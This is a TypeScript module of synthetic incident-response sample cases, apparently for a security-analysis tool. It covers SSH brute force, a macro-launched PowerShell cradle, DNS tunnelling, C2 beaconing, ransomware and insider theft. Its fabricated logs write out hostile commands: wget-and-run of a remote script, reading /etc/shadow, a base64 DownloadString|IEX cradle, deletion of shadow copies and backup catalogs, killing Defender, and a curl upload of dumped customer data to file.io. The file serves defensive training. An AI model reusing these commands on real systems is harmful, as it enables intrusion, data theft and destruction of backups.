import type { ArtifactKind } from "@workspace/api-client-react";

export interface SampleArtifact {
  kind: ArtifactKind;
  filename: string;
  content: string;
  contentEncoding?: "text" | "base64";
}

// ---------- Synthetic disk image for the 4th sample case ----------
// Builds a 4 KB raw image: a 512-byte MBR with one Linux partition (type 0x83,
// startLBA=1, sizeLBA=7) followed by 7 sectors of mostly-zero data with a few
// ASCII strings scattered through it so the diskImageAnalyzer can recover
// embedded IOCs without us shipping any real evidence.
// NOTE: type annotations are intentionally omitted from this helper so the
// accuracy harness can `new Function` over this file after a regex strip.
function buildSampleDiskImage() {
  const SECTOR = 512;
  const buf = new Uint8Array(SECTOR * 8);

  // MBR partition entry 0 at offset 446.
  buf[446] = 0x80; // bootable
  buf[447] = 0x00; buf[448] = 0x02; buf[449] = 0x00; // start CHS (unused here)
  buf[450] = 0x83; // partition type: Linux native
  buf[451] = 0x00; buf[452] = 0x04; buf[453] = 0x04; // end CHS (unused here)
  // start LBA = 1
  buf[454] = 0x01; buf[455] = 0x00; buf[456] = 0x00; buf[457] = 0x00;
  // size LBA = 7
  buf[458] = 0x07; buf[459] = 0x00; buf[460] = 0x00; buf[461] = 0x00;
  // MBR signature 0x55AA
  buf[510] = 0x55;
  buf[511] = 0xaa;

  // Sprinkle ASCII evidence strings through the partition area (offset >= 512).
  const fragments = [
    [0x0200, "Linux rescue image v2.4.1-staging\n"],
    [0x0300, "C2 server: 91.219.236.142\n"],
    [0x0480, "callback URL: http://malware-staging.xyz/beacon.php\n"],
    [0x0640, "exfil endpoint: https://exfil-c2.evil-domain.org/dump\n"],
    [0x0820, "implant user: deploy\nimplant pass: P@ssw0rd-from-disk\n"],
    [0x0a00, "scheduled task: cron @reboot /opt/.k/run.sh\n"],
    [0x0c20, "last beacon: 2026-05-22T18:44:12Z OK\n"],
  ];
  for (const [off, text] of fragments) {
    for (let i = 0; i < text.length; i++) {
      buf[off + i] = text.charCodeAt(i);
    }
  }

  // Base64-encode without Node Buffer (this file runs in the browser bundle).
  let bin = "";
  const chunk = 0x8000;
  for (let i = 0; i < buf.length; i += chunk) {
    bin += String.fromCharCode(...buf.subarray(i, i + chunk));
  }
  return btoa(bin);
}

const ransomwareDiskImageBase64 = buildSampleDiskImage();

const ransomwareTriageNote = `Ticket: IR-2026-0142
Reporter: SOC L2 (M. Okafor)
Source: forensic acquisition team

A ~4 KB raw disk image was carved from unallocated space on a quarantined
finance laptop (WIN-FIN-07). The carve targeted an MBR signature, so the
partition table is intact but no filesystem metadata above it is trustworthy.

Triage objectives:
  1. Confirm the image really is a partitioned disk (not just random bytes).
  2. Enumerate the partition table and identify the filesystem(s).
  3. Recover any printable strings and surface embedded indicators (IPs,
     domains, URLs, credentials) without mounting the image.
  4. Decide whether the indicators warrant pivoting onto network logs.

Constraints:
  - Pure-Node analysis only — no Sleuth Kit, no losetup, no mount.
  - Treat the image as cold evidence: hash must match the acquisition hash.
`;


export interface SampleCase {
  id: string;
  title: string;
  shortLabel: string;
  scenario: string;
  description: string;
  artifacts: SampleArtifact[];
}

const sshBruteForceLog = `2026-05-17T03:14:02Z sshd[18421]: Failed password for invalid user admin from 185.220.101.47 port 49812 ssh2
2026-05-17T03:14:03Z sshd[18421]: Failed password for invalid user admin from 185.220.101.47 port 49812 ssh2
2026-05-17T03:14:05Z sshd[18421]: Failed password for invalid user root from 185.220.101.47 port 49814 ssh2
2026-05-17T03:14:06Z sshd[18421]: Failed password for invalid user root from 185.220.101.47 port 49814 ssh2
2026-05-17T03:14:08Z sshd[18421]: Failed password for invalid user postgres from 185.220.101.47 port 49820 ssh2
2026-05-17T03:14:11Z sshd[18421]: Failed password for invalid user oracle from 185.220.101.47 port 49826 ssh2
2026-05-17T03:14:13Z sshd[18421]: Failed password for invalid user jenkins from 185.220.101.47 port 49830 ssh2
2026-05-17T03:14:15Z sshd[18421]: Failed password for invalid user git from 185.220.101.47 port 49834 ssh2
2026-05-17T03:14:18Z sshd[18421]: Failed password for invalid user ubuntu from 185.220.101.47 port 49840 ssh2
2026-05-17T03:14:21Z sshd[18421]: Failed password for invalid user ec2-user from 185.220.101.47 port 49844 ssh2
2026-05-17T03:14:24Z sshd[18421]: Failed password for invalid user devops from 185.220.101.47 port 49850 ssh2
2026-05-17T03:14:27Z sshd[18421]: Failed password for invalid user test from 185.220.101.47 port 49854 ssh2
2026-05-17T03:14:31Z sshd[18421]: Failed password for invalid user backup from 185.220.101.47 port 49860 ssh2
2026-05-17T03:14:34Z sshd[18421]: Failed password for deploy from 185.220.101.47 port 49866 ssh2
2026-05-17T03:14:37Z sshd[18421]: Failed password for deploy from 185.220.101.47 port 49870 ssh2
2026-05-17T03:14:40Z sshd[18421]: Failed password for deploy from 185.220.101.47 port 49874 ssh2
2026-05-17T03:14:43Z sshd[18421]: Failed password for deploy from 185.220.101.47 port 49878 ssh2
2026-05-17T03:14:46Z sshd[18421]: Failed password for deploy from 185.220.101.47 port 49882 ssh2
2026-05-17T03:14:49Z sshd[18421]: Failed password for deploy from 185.220.101.47 port 49886 ssh2
2026-05-17T03:14:52Z sshd[18421]: Accepted password for deploy from 185.220.101.47 port 49890 ssh2
2026-05-17T03:14:52Z sshd[18421]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
2026-05-17T03:15:04Z sudo[18512]:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
2026-05-17T03:15:18Z sudo[18519]:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://185.220.101.47:8080/k.sh -O /tmp/.k
2026-05-17T03:15:22Z sudo[18524]:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash /tmp/.k
2026-05-17T03:15:25Z sshd[18421]: pam_unix(sshd:session): session closed for user deploy
`;

const sshAuthContext = `Host: web-prod-02 (10.0.4.21)
OS: Ubuntu 22.04 LTS
Service: OpenSSH_8.9p1
Exposed: yes (port 22 open to 0.0.0.0/0)
Fail2ban: disabled
MFA on SSH: not configured
Known good users: deploy, ubuntu, root (key-only — password auth was supposed to be off)
Note: a config push at 2026-05-17T02:50Z accidentally re-enabled PasswordAuthentication.
`;

const powershellAttackLog = `2026-05-18T11:02:14Z WIN-FIN-07 Microsoft-Windows-PowerShell/Operational EventID=4104
ScriptBlockText:
$ErrorActionPreference='SilentlyContinue'
IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGM9TmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50OyRjLkRvd25sb2FkU3RyaW5nKCJodHRwOi8vNDUuMzMuMzIuMTU2L2EucHMxIikgfCBJRVg=')))

2026-05-18T11:02:14Z WIN-FIN-07 Microsoft-Windows-PowerShell/Operational EventID=4104
ScriptBlockText:
$c=New-Object Net.WebClient;$c.DownloadString("http://45.33.32.156/a.ps1") | IEX

2026-05-18T11:02:15Z WIN-FIN-07 Sysmon EventID=3 (Network connect)
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
User: CORP\\jhamilton
DestinationIp: 45.33.32.156
DestinationPort: 80
DestinationHostname: -

2026-05-18T11:02:18Z WIN-FIN-07 Sysmon EventID=1 (Process create)
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwA0ADUALgAzADMALgAzADIALgAxADUANgAvAGwALgBkAGwAbAA=
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
ParentCommandLine: "WINWORD.EXE" /n "C:\\Users\\jhamilton\\Downloads\\Q2_Revenue_Forecast.docm"

2026-05-18T11:02:21Z WIN-FIN-07 Sysmon EventID=11 (File create)
TargetFilename: C:\\Users\\jhamilton\\AppData\\Roaming\\Microsoft\\Windows\\l.dll

2026-05-18T11:02:23Z WIN-FIN-07 Sysmon EventID=1 (Process create)
Image: C:\\Windows\\System32\\rundll32.exe
CommandLine: rundll32.exe C:\\Users\\jhamilton\\AppData\\Roaming\\Microsoft\\Windows\\l.dll,EntryPoint
ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe

2026-05-18T11:02:25Z WIN-FIN-07 Sysmon EventID=13 (Registry value set)
TargetObject: HKU\\S-1-5-21-...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync
Details: rundll32.exe C:\\Users\\jhamilton\\AppData\\Roaming\\Microsoft\\Windows\\l.dll,EntryPoint
`;

const powershellEndpointContext = `Endpoint: WIN-FIN-07
User: jhamilton (Finance — Senior Analyst)
EDR: Defender for Endpoint (real-time protection ON)
Last known good baseline: 2026-05-17T22:00Z

Note: User reported clicking through a "macro warning" on a Word doc emailed
from "cfo-office@corp-fіnance.com" (Cyrillic 'і' in 'finance') at ~11:01 local time.
Decoded base64 payload (first block): $c=New-Object Net.WebClient;$c.DownloadString("http://45.33.32.156/a.ps1") | IEX
`;

const dnsExfilLog = `# bind9 query log — internal resolver ns1.corp.local
2026-05-18T22:11:03Z client 10.0.7.84#52341 (a7f3.k29bm9p1q8s.exfil-gateway.com): query: a7f3.k29bm9p1q8s.exfil-gateway.com IN TXT
2026-05-18T22:11:03Z client 10.0.7.84#52342 (b9e1.j8nz4xw0v7r.exfil-gateway.com): query: b9e1.j8nz4xw0v7r.exfil-gateway.com IN TXT
2026-05-18T22:11:04Z client 10.0.7.84#52343 (c4d8.h6mk3yqe2lf.exfil-gateway.com): query: c4d8.h6mk3yqe2lf.exfil-gateway.com IN TXT
2026-05-18T22:11:04Z client 10.0.7.84#52344 (d2a9.g5lw1zsd4kj.exfil-gateway.com): query: d2a9.g5lw1zsd4kj.exfil-gateway.com IN TXT
2026-05-18T22:11:05Z client 10.0.7.84#52345 (e8b2.f4kr8ats7nh.exfil-gateway.com): query: e8b2.f4kr8ats7nh.exfil-gateway.com IN TXT
2026-05-18T22:11:05Z client 10.0.7.84#52346 (f1c5.e3jv6bru9md.exfil-gateway.com): query: f1c5.e3jv6bru9md.exfil-gateway.com IN TXT
2026-05-18T22:11:06Z client 10.0.7.84#52347 (g7d6.d2it5csa1pb.exfil-gateway.com): query: g7d6.d2it5csa1pb.exfil-gateway.com IN TXT
2026-05-18T22:11:06Z client 10.0.7.84#52348 (h3e9.c1hs4dty0qc.exfil-gateway.com): query: h3e9.c1hs4dty0qc.exfil-gateway.com IN TXT
2026-05-18T22:11:07Z client 10.0.7.84#52349 (i6f4.b0gr3euz9xv.exfil-gateway.com): query: i6f4.b0gr3euz9xv.exfil-gateway.com IN TXT
2026-05-18T22:11:07Z client 10.0.7.84#52350 (j9g2.a9fq2fvy8wn.exfil-gateway.com): query: j9g2.a9fq2fvy8wn.exfil-gateway.com IN TXT
... 4,812 similar TXT queries to *.exfil-gateway.com between 22:11:03 and 22:23:47 ...
2026-05-18T22:23:47Z client 10.0.7.84#56102 (END.0000.exfil-gateway.com): query: END.0000.exfil-gateway.com IN TXT
2026-05-18T22:23:47Z client 10.0.7.84#56103 (END.0001.exfil-gateway.com): query: END.0001.exfil-gateway.com IN TXT
Total queries to *.exfil-gateway.com (last 30 min): 4814
Unique subdomains: 4812
Average subdomain length: 48 chars
Mean inter-query interval: 0.156s
`;

const dnsHostContext = `Source host: 10.0.7.84 — DB-REPLICA-03 (PostgreSQL read replica, prod customer DB)
Owner: Data Platform team
Outbound policy: should ONLY talk to 10.0.0.0/8 + internal NTP/DNS
Egress firewall: permits UDP/53 to internal resolver only (ns1.corp.local)
ns1.corp.local: recursive resolver — forwards external lookups to 8.8.8.8
exfil-gateway.com: registered 2026-05-12 via Namecheap, NS records on cloudflare
No business reason for this host to query exfil-gateway.com
`;

// ---------- Higher-risk scenarios ----------

// A real classic-pcap capture (big-endian, link type Ethernet) built offline
// and embedded as base64, exactly like a captured artifact. It contains a DNS
// A-record lookup for sync.fastcdn-telemetry.live followed by eight TCP/443
// beacons from 10.0.9.30 to the public C2 45.61.138.92 at a fixed 30s cadence
// over four minutes. Decodes via analyze_pcap to a single fat conversation, two
// destination endpoints, one DNS query, and one public-IP / one domain IOC.
const c2BeaconPcapBase64 =
  "obLD1AACAAQAAAAAAAAAAAAA//8AAAABag0HkAAAAAAAAABXAAAAVwJCCgAAAQJCCgAJHggARQAASQABQABAEQAACgAJHgoAADXDUAA1ADUAABI0AQAAAQAAAAAAAARzeW5jEWZhc3RjZG4tdGVsZW1ldHJ5BGxpdmUAAAEAAWoNB64AAAAAAAAAOgAAADoCQgoAAAECQgoACR4IAEUAACwAAUAAQAYAAAoACR4tPYpcxzgBuwAAEAAAACAAUBggAAAAAADerb7vag0HzAAAAAAAAAA6AAAAOgJCCgAAAQJCCgAJHggARQAALAABQABABgAACgAJHi09ilzHOAG7AAAQAAAAIABQGCAAAAAAAN6tvu9qDQfqAAAAAAAAADoAAAA6AkIKAAABAkIKAAkeCABFAAAsAAFAAEAGAAAKAAkeLT2KXMc4AbsAABAAAAAgAFAYIAAAAAAA3q2+72oNCAgAAAAAAAAAOgAAADoCQgoAAAECQgoACR4IAEUAACwAAUAAQAYAAAoACR4tPYpcxzgBuwAAEAAAACAAUBggAAAAAADerb7vag0IJgAAAAAAAAA6AAAAOgJCCgAAAQJCCgAJHggARQAALAABQABABgAACgAJHi09ilzHOAG7AAAQAAAAIABQGCAAAAAAAN6tvu9qDQhEAAAAAAAAADoAAAA6AkIKAAABAkIKAAkeCABFAAAsAAFAAEAGAAAKAAkeLT2KXMc4AbsAABAAAAAgAFAYIAAAAAAA3q2+72oNCGIAAAAAAAAAOgAAADoCQgoAAAECQgoACR4IAEUAACwAAUAAQAYAAAoACR4tPYpcxzgBuwAAEAAAACAAUBggAAAAAADerb7vag0IgAAAAAAAAAA6AAAAOgJCCgAAAQJCCgAJHggARQAALAABQABABgAACgAJHi09ilzHOAG7AAAQAAAAIABQGCAAAAAAAN6tvu8=";

const c2BeaconContext = `Capture host: 10.0.9.30 — WIN-ENG-14 (engineering workstation, CORP\\amalik)
Capture window: 2026-05-20T01:00Z onward (15-min span pulled by NDR sensor)
EDR: CrowdStrike Falcon — sensor reporting, no detection fired
Network policy: workstations may reach the internet via proxy 10.0.0.8 ONLY
Observed: direct outbound TCP/443 to 45.61.138.92, bypassing the proxy
sync.fastcdn-telemetry.live: registered 2026-05-18, 2 days before capture
Note: the beacon interval looks machine-regular, not human browsing.
`;

const ransomwareInProgressLog = `2026-05-21T02:47:11Z FS-CORP-01 Sysmon EventID=1 (Process create)
Image: C:\\ProgramData\\svchost-update\\runner.exe
CommandLine: runner.exe -nolog -enc -targets \\\\FS-CORP-01\\dept_shares
User: CORP\\svc-backup
ParentImage: C:\\Windows\\System32\\services.exe
Hashes: SHA256=9F2C7A4E1B0D6C8855AE13FF20C9B7E4D1A6F309C2B884771E5DA0C3F6B9A1B7
Signed: false

2026-05-21T02:47:12Z FS-CORP-01 Sysmon EventID=1 (Process create)
CommandLine: vssadmin.exe delete shadows /all /quiet
ParentImage: C:\\ProgramData\\svchost-update\\runner.exe

2026-05-21T02:47:12Z FS-CORP-01 Sysmon EventID=1 (Process create)
CommandLine: wmic.exe shadowcopy delete
ParentImage: C:\\ProgramData\\svchost-update\\runner.exe

2026-05-21T02:47:13Z FS-CORP-01 Sysmon EventID=1 (Process create)
CommandLine: bcdedit.exe /set {default} recoveryenabled No
ParentImage: C:\\ProgramData\\svchost-update\\runner.exe

2026-05-21T02:47:13Z FS-CORP-01 Sysmon EventID=1 (Process create)
CommandLine: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
ParentImage: C:\\ProgramData\\svchost-update\\runner.exe

2026-05-21T02:47:14Z FS-CORP-01 Sysmon EventID=1 (Process create)
CommandLine: wbadmin.exe delete catalog -quiet
ParentImage: C:\\ProgramData\\svchost-update\\runner.exe

2026-05-21T02:47:15Z FS-CORP-01 Sysmon EventID=1 (Process create)
CommandLine: net.exe stop "Veeam Backup Service" /y
ParentImage: C:\\ProgramData\\svchost-update\\runner.exe

2026-05-21T02:47:16Z FS-CORP-01 Sysmon EventID=1 (Process create)
CommandLine: taskkill.exe /F /IM MsMpEng.exe
ParentImage: C:\\ProgramData\\svchost-update\\runner.exe

2026-05-21T02:47:21Z FS-CORP-01 Sysmon EventID=11 (File create)
TargetFilename: D:\\dept_shares\\Finance\\FY26_budget.xlsx.lockbit5
2026-05-21T02:47:21Z FS-CORP-01 Sysmon EventID=11 (File create)
TargetFilename: D:\\dept_shares\\Finance\\RESTORE-FILES.txt
2026-05-21T02:47:22Z FS-CORP-01 Sysmon EventID=11 (File create)
TargetFilename: D:\\dept_shares\\HR\\offer_letters.pdf.lockbit5
... 41,209 further .lockbit5 file-create events across D:\\dept_shares in 6 min ...

2026-05-21T02:48:30Z FS-CORP-01 Sysmon EventID=3 (Network connect)
Image: C:\\ProgramData\\svchost-update\\runner.exe
DestinationIp: 10.0.4.62
DestinationPort: 445
DestinationHostname: FS-CORP-02

2026-05-21T02:48:31Z FS-CORP-02 Security EventID=7045 (Service install)
ServiceName: PSEXESVC
ImagePath: C:\\Windows\\PSEXESVC.exe
AccountName: CORP\\svc-backup
`;

const ransomwareInProgressContext = `Asset: FS-CORP-01 (10.0.4.61) — primary departmental file server
Shares: D:\\dept_shares — ~2.1 TB, Finance / HR / Legal / Engineering
Account abused: svc-backup (domain service account, local admin on all file servers)
  - Password last set: 2024-11-02 (never rotated); used by legacy backup jobs
Backups: Veeam to on-prem repo (NOT immutable); last successful job 2026-05-20T23:00Z
  - Offsite/immutable copy: project was scoped but never funded
EDR: CrowdStrike on workstations; file servers were exempted "for performance"
Blast radius unknown: svc-backup is local admin on FS-CORP-02..05 as well
Containment will take production file shares offline for the whole company.
`;

const insiderExfilLog = `# auditd + pgaudit + shell history — bastion DB host db-bastion-01 (10.0.6.12)
2026-05-22T23:41:07Z auditd USER_LOGIN acct=rkapoor addr=10.0.6.200 terminal=ssh res=success
2026-05-22T23:41:55Z bash[rkapoor]: export HISTFILE=/dev/null
2026-05-22T23:42:10Z bash[rkapoor]: psql -h prod-db-01 -U rkapoor -d customers -c "\\copy (select * from customers) to '/tmp/.c/cust.csv' csv header"
2026-05-22T23:43:02Z pgaudit prod-db-01 SESSION rkapoor READ customers.customers rows=2841992
2026-05-22T23:44:18Z bash[rkapoor]: pg_dump -h prod-db-01 -U rkapoor -t payments -t cards customers -Fc -f /tmp/.c/pay.dump
2026-05-22T23:46:51Z pgaudit prod-db-01 SESSION rkapoor READ customers.cards rows=981233
2026-05-22T23:48:30Z bash[rkapoor]: tar czf /tmp/.c/export.tgz /tmp/.c/cust.csv /tmp/.c/pay.dump
2026-05-22T23:49:10Z auditd SYSCALL mount dev=sdb1 fstype=vfat -> /media/rkapoor/USB64 (label KINGSTON)
2026-05-22T23:49:44Z bash[rkapoor]: cp /tmp/.c/export.tgz /media/rkapoor/USB64/
2026-05-22T23:51:02Z bash[rkapoor]: curl -sf -T /tmp/.c/export.tgz https://file.io/ -o /tmp/.c/up.json
2026-05-22T23:51:39Z bash[rkapoor]: shred -u /tmp/.c/cust.csv /tmp/.c/pay.dump /tmp/.c/export.tgz
2026-05-22T23:51:55Z bash[rkapoor]: history -c
2026-05-22T23:52:03Z auditd USER_LOGOUT acct=rkapoor addr=10.0.6.200 terminal=ssh
`;

const insiderExfilContext = `Subject: rkapoor (R. Kapoor) — Senior Database Administrator, Data Platform
Access: standby read on prod-db-01; full DBA on the staging estate
HR flag: submitted resignation 2026-05-19; last day 2026-06-02; declared next
  employer is a direct competitor (per exit interview notes)
Data touched: customers.customers (PII), customers.payments + customers.cards
  (PCI scope — cardholder data, encrypted at rest but readable via the app role)
Policy: bulk export of PCI tables requires a ticket + second approver; none filed
DLP: endpoint DLP not installed on bastion hosts; USB mass-storage not blocked
Off-hours: all activity 23:41–23:52 local, outside the subject's normal pattern
This is a personnel-sensitive matter — conclusions must be strictly evidence-based.
`;

export const SAMPLE_CASES: SampleCase[] = [
  {
    id: "ssh-bruteforce-breakthrough",
    shortLabel: "SSH Brute Force → Breach",
    title: "SSH brute force with successful breakthrough on web-prod-02",
    scenario: "Credential attack",
    description:
      "Fail2ban alerts flagged 19 failed SSH logins from 185.220.101.47 against web-prod-02 over a ~50 second window, followed by a successful login as the 'deploy' service account. Within 30 seconds the session read /etc/shadow and pulled a remote shell script to /tmp. Determine whether the host is compromised, scope the blast radius, and recommend containment.",
    artifacts: [
      { kind: "log_file", filename: "auth.log", content: sshBruteForceLog },
      { kind: "text", filename: "host_context.md", content: sshAuthContext },
    ],
  },
  {
    id: "powershell-encoded-payload",
    shortLabel: "Encoded PowerShell",
    title: "Suspicious encoded PowerShell launched from Word macro on WIN-FIN-07",
    scenario: "Malware / phishing",
    description:
      "Defender flagged an encoded PowerShell command line spawned by WINWORD.EXE on a finance workstation. The macro originated from a lookalike sender domain (Cyrillic homoglyph in 'finance'). A DLL was dropped to %AppData% and a Run key was added for persistence. Decode the payload, determine intent, and recommend response.",
    artifacts: [
      { kind: "log_file", filename: "powershell_sysmon.log", content: powershellAttackLog },
      { kind: "text", filename: "endpoint_context.md", content: powershellEndpointContext },
    ],
  },
  {
    id: "dns-data-exfiltration",
    shortLabel: "DNS Data Exfiltration",
    title: "Suspected DNS tunneling exfiltration from DB-REPLICA-03",
    scenario: "Data exfiltration",
    description:
      "Internal DNS resolver logged 4,800+ TXT queries to *.exfil-gateway.com from a production DB read replica in 12 minutes. Subdomains are high-entropy and ~48 chars long. The host has no business reason to talk to that domain. Determine whether this is DNS tunneling exfil, identify the channel, and recommend containment.",
    artifacts: [
      { kind: "log_file", filename: "bind9_query.log", content: dnsExfilLog },
      { kind: "text", filename: "host_context.md", content: dnsHostContext },
    ],
  },
  {
    id: "disk-image-carve",
    shortLabel: "Disk Image Carve",
    title: "Raw disk image carved from unallocated space on WIN-FIN-07",
    scenario: "Disk forensics",
    description:
      "Forensics handed over a small raw disk image (~4 KB) recovered from unallocated space on the WIN-FIN-07 finance laptop. The acquisition team confirmed an intact MBR signature but could not mount the image. Parse the partition table, identify any embedded filesystem signatures, extract printable strings, and surface any IPs, domains, URLs, or credentials hiding in the slack so the SOC can decide whether to pivot to network telemetry.",
    artifacts: [
      {
        kind: "disk_image",
        filename: "carved.img",
        content: ransomwareDiskImageBase64,
        contentEncoding: "base64",
      },
      { kind: "text", filename: "triage_note.md", content: ransomwareTriageNote },
    ],
  },
  {
    id: "c2-beacon-pcap",
    shortLabel: "C2 Beacon (pcap)",
    title: "Periodic C2 beaconing in a packet capture from WIN-ENG-14",
    scenario: "Command & control",
    description:
      "An NDR sensor pulled a packet capture from engineering workstation WIN-ENG-14 (10.0.9.30). It shows a DNS lookup for a 2-day-old domain followed by repeated TCP/443 connections to a public IP at a fixed 30-second cadence — direct egress that bypasses the mandatory proxy, with no EDR detection. Parse the capture, confirm whether this is automated C2 beaconing, extract the destination indicators, and recommend containment.",
    artifacts: [
      {
        kind: "network_capture",
        filename: "win-eng-14.pcap",
        content: c2BeaconPcapBase64,
        contentEncoding: "base64",
      },
      { kind: "text", filename: "capture_context.md", content: c2BeaconContext },
    ],
  },
  {
    id: "ransomware-in-progress",
    shortLabel: "Ransomware In Progress",
    title: "Active ransomware deployment on file server FS-CORP-01",
    scenario: "Ransomware",
    description:
      "An unsigned binary running as the svc-backup service account on the primary departmental file server deleted volume shadow copies, disabled boot recovery, purged the backup catalog, stopped Veeam, killed Defender, and began mass-encrypting D:\\dept_shares (40k+ .lockbit5 files) before pivoting to FS-CORP-02 over SMB with PsExec. Reconstruct the kill chain, scope the blast radius, and recommend immediate containment knowing it will take company-wide file shares offline.",
    artifacts: [
      { kind: "log_file", filename: "fs-corp-01_sysmon.log", content: ransomwareInProgressLog },
      { kind: "text", filename: "asset_context.md", content: ransomwareInProgressContext },
    ],
  },
  {
    id: "insider-data-theft",
    shortLabel: "Insider Data Theft",
    title: "Departing DBA bulk-exfiltrating PII/PCI from db-bastion-01",
    scenario: "Insider threat",
    description:
      "A senior DBA who resigned to join a competitor logged into the DB bastion at 23:41, disabled shell history, dumped 2.8M customer records and ~980k cardholder rows from production, copied the archive to a USB stick and uploaded it to file.io, then shredded the staging files and cleared history — all off-hours with no change ticket or second approver. Establish what was taken, how it left, and recommend response while keeping every conclusion strictly evidence-based.",
    artifacts: [
      { kind: "log_file", filename: "db-bastion-01_audit.log", content: insiderExfilLog },
      { kind: "text", filename: "personnel_context.md", content: insiderExfilContext },
    ],
  },
];
